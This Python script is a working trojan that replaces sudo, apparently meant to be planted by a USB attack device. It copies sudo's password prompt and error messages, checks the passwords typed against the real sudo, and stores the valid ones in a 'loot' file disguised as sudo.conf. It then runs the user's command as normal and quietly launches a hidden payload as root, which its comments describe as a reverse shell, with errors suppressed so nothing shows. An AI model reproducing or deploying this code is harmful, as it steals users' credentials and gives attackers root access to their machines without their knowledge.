#!/usr/bin/env python

realSudo = "/usr/bin/sudo" #"REAL_SUDO_HERE"
pythonInterpreter = "PYTHON_EXECUTABLE_GOES_HERE"

def cantLoadModuleError():
    import sys
    if sys.version_info.major < 3:
        return ImportError
    return ImportError if sys.version_info.minor < 6 else ModuleNotFoundError

def getLootFileName():
    import os
    thisFullPath = os.path.abspath(__file__)
    thisDirectory = os.path.split(thisFullPath)[0]
    lootFile = thisDirectory + os.sep + "sudo.conf"
    return os.path.join(lootFile)

def initializeThisScript():
    '''This function will be run the first time by the bunny'''
    import subprocess
    import re
    pathFinder = subprocess.Popen("which python".split(), stdout = subprocess.PIPE)
    pythonExecutable = pathFinder.stdout.read().strip()
    pathFinder = subprocess.Popen("which sudo".split(), stdout = subprocess.PIPE)
    sudoExecutable = pathFinder.stdout.read().strip()
    try:
        import json
    except cantLoadModuleError():
        try:
            jsonInstaller = subprocess.Popen("pip install --user json".split(), stdout = subprocess.PIPE, stderr = subprocess.PIPE)
            jsonInstaller = subprocess.Popen("pip3 install --user json".split(), stdout = subprocess.PIPE, stderr = subprocess.PIPE)
        except:
            pass
    try:
        import getpass
    except:
        try:
            getPassInstaller = subprocess.Popen("pip install --user getpass".split(), stdout = subprocess.PIPE, stderr = subprocess.PIPE)
        except:
            pass
    thisFileName = __file__
    with open(thisFileName, 'r') as thisFile:
        originalCode = thisFile.read()
    newCode = re.sub("PYTHON_EXECUTABLE_GOES_HERE", pythonExecutable, originalCode, 1)
    newCode = re.sub("REAL_SUDO_HERE", sudoExecutable, newCode, 1)
    with open(thisFileName, 'w') as thisFile:
        thisFile.write(newCode)
    createLootFile(getLootFileName())
    silencePayloadFile()
    quit()
    
def createLootFile(lootFileName):
    import json
    initialData = {}
    with open(lootFileName, 'w') as lootFile:
        json.dump(initialData, lootFile)

def validSudoPassword(password):
    import subprocess
    command = [realSudo, "-S", "-b", "echo", "Echo this"]
    wrapper = subprocess.Popen(command, stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
    wrapper.communicate(password + "\n")
    #wrapper.terminate()
    return not wrapper.returncode

def getPayloadFile():
    import os
    programDirectory = os.path.split(__file__)[0]
    return programDirectory + os.sep + ".sudo"

def silencePayloadFile():  #if there is an error making our reverse https, such as a bad network connection, this will make it fail without any output
    import os
    payloadFileName = getPayloadFile()
    if os.path.isfile(payloadFileName):
        with open(payloadFileName, 'r') as payloadFile:
            payload = payloadFile.read()
        payload = "try:\n\t" + payload + "\nexcept:\n\tpass"
        with open(payloadFileName, 'w') as payloadFile:
            payloadFile.write(payload)

def blueTurtleShell(password):  #we are going to give it a password here.  It won't cause a problem if it is not needed, and it might be needed if the user was doing some long process for the sudo.
    import subprocess
    import os
    payloadFile = getPayloadFile()
    if not os.path.isfile(payloadFile):
        return False
    command = " ".join([realSudo, "-S", "-b", pythonInterpreter, payloadFile])
    hackTheGibson = subprocess.Popen(command, stdin = subprocess.PIPE, shell = True)
    hackTheGibson.communicate(password + "\n")

def runIntendedSudoCommand():  #we won't need a password here, since we just got a good sudo when we verified their password
    import sys
    import os
    args = sys.argv[1:]
    for index, arg in enumerate(args):
        if arg == "sudo":
            args[index] = realSudo
    command = " ".join([realSudo, "-S"] + args)
    os.system(command)  #not using subprocess.  Usually the ability to mess with stdin/out/err is useful, but it just gets in the way of delivering the true user experience here.  Especially if they use something interactive like vim.
    
def getSudoPassword(allowedAttempts = 3):
    import getpass
    user = getpass.getuser()
    if validSudoPassword(""):  #this avoids having the program ask for a password if a valid one was just entered (normal sudo behavior).  Also avoids creating a bunch of reverse shells if the user is repeatedly using sudo (that could create some noise on both ends)
        return (user, "", False)
    prompt = f"[sudo] password for {user}: "
    fail = "Sorry, try again."
    epicFail = f"sudo: {allowedAttempts} incorrect password attempts"
    success = False
    for i in range(allowedAttempts):
        password = getpass.getpass(prompt)
        if validSudoPassword(password):
            success = True
            break
        else:
            if i != allowedAttempts - 1:
                print(fail)
    if not success:
        import sys
        print(epicFail)
        sys.stdout = open("/dev/null", 'w')  #sometimes this generates stray outputs if there are three failed attempts.  Sending them to limbo.
        sys.stderr = open("/dev/null", 'w')
        sys.stdout.flush()
        sys.stderr.flush()
        quit()
    return (user, password, True)

def loadLootFile(lootFileName):
    import json
    try:
        with open(lootFileName, 'r') as file:
            data = json.load(file)
        return data
    except:
        return False
    
def saveLootFile(loot, lootFileName):
    import json
    try:
        with open(lootFileName, 'w') as file:
            json.dump(loot, file)
    except:
        pass
    
def parseArguments():
    import sys
    argList = sys.argv
    if "--initializeScript" in sys.argv:
        initializeThisScript()
    else:
        return argList


def prewrap():
    parseArguments()
    lootFile = getLootFileName()
    loot = loadLootFile(lootFile)
    try:
        user, password, passwordNeeded = getSudoPassword()
    except:
        user = None
        password = None
        passwordNeeded = True
    if passwordNeeded and user:
        loot[user] = password
    if loot:
        saveLootFile(loot, lootFile)
    return (user, password, passwordNeeded, loot)    

def postwrap(user, password, loot):
    if not passwordNeeded and user:
        try:
            password = loot[user]
        except:
            password = ""
    blueTurtleShell(password)    

if __name__ == '__main__':
    parseArguments()
    try:
        user, password, passwordNeeded, loot = prewrap()
    except:
        pass
    runIntendedSudoCommand()
    try:
        postwrap(user, password, loot)
    except:
        pass
